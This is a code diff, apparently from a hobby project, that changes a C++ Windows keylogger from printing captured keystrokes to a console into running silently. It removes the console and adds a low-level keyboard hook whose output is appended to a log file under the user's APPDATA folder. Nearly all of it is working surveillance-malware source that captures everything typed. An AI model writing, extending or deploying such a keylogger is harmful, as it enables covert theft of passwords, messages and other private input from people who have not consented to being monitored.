@@ -2,9 +2,10 @@
  * @file
  * @author Isaiah Lateer
  * 
- * Processes and outputs key presses to the console
+ * Processes and outputs key presses into a file
  */
 
+#include <fstream>
 #include <string>
 
 #include <windows.h>
@@ -51,6 +52,31 @@ std::string translate(_In_ char primary, _In_ char secondary, _In_ bool win,
 }
 
 /**
+ * Writes a string to a file
+ *
+ * @param out is the string to be written
+ */
+void write(_In_ std::string out) {
+	char* buffer;
+	size_t size;
+	if (_dupenv_s(&buffer, &size, "APPDATA") || !buffer)
+		return;
+
+	std::fstream file;
+	std::string path = std::string(buffer) + "\\Keylogger";
+	file.open(path + "\\log.txt", std::ios::out | std::ios::app);
+	if (!file.is_open()) {
+		CreateDirectoryA(path.c_str(), nullptr);
+		file.open(path + "\\log.txt", std::ios::out | std::ios::binary);
+	}
+
+	if (file.is_open()) {
+		file << out;
+		file.close();
+	}
+}
+
+/**
  * Hook procedure
  * 
  * Processes and outputs key events to the console. Then passes the hook
@@ -63,14 +89,12 @@ std::string translate(_In_ char primary, _In_ char secondary, _In_ bool win,
  */
 LRESULT CALLBACK procedure(_In_ int code, _In_ WPARAM wParam,
 	_In_ LPARAM lParam) {
-	static HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
+	static std::string log;
 	static bool win = false;
 	static bool shift = false;
 	static bool caps = false;
 	static bool ctrl = false;
 	static bool alt = false;
-
-	std::string log;
 
 	if (code == HC_ACTION) {
 		PKBDLLHOOKSTRUCT key = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
@@ -362,17 +386,20 @@ LRESULT CALLBACK procedure(_In_ int code, _In_ WPARAM wParam,
 		}
 	}
 
-	WriteConsoleA(out, log.c_str(), log.length(), NULL, NULL);
+	if (log.length() > 100) {
+		write(log);
+		log.clear();
+	}
+
 	return CallNextHookEx(NULL, code, wParam, lParam);
 }
 
 /**
  * Program entry-point
  * 
- * Standard Windows entry-point for C and C++ programs. Allocates a console
- * and then establishes a keyboard hook. Loops over messages, translating and
- * dispatching them. Once terminated, the hook is released and the console is
- * freed.
+ * Standard Windows entry-point for C and C++ programs. Establishes a keyboard
+ * hook. Loops over messages, translating and dispatching them. Once
+ * terminated, the hook is released and the console is freed.
  * 
  * @param instance is the handle to the program when loaded in memory
  * @param prevInstance is used for backwards compatability with 16-bit Windows
@@ -382,7 +409,6 @@ LRESULT CALLBACK procedure(_In_ int code, _In_ WPARAM wParam,
  */
 int WINAPI wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prevInstance,
 	_In_ PWSTR cmdLine, _In_ int cmdShow) {
-	AllocConsole();
 	HHOOK hook = SetWindowsHookExW(WH_KEYBOARD_LL, procedure, nullptr, NULL);
 
 	MSG msg;
@@ -392,6 +418,5 @@ int WINAPI wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prevInstance,
 	}
 
 	UnhookWindowsHookEx(hook);
-	FreeConsole();
 	return EXIT_SUCCESS;
 }
